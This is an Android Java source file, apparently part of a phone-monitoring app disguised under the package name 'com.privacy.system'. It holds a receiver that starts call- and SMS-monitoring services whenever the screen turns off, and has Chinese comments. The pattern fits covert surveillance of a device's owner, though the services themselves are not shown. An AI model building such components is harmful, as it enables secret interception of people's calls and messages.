package com.privacy.system.receiver;

import com.privacy.system.service.CallMonitoringService;
import com.privacy.system.service.SMSMonitoringService;
import com.privacy.system.util.Logger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * 接收屏幕关闭所发出的广播
 */
public class ScreenOffReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Logger.d("Screen", "屏幕关闭了");
		 Intent intent2 = new Intent(context,CallMonitoringService.class);
		 context.startService(intent2);
			
	      Intent intent3 = new Intent(context,SMSMonitoringService.class);
	      context.startService(intent3);
	}
}
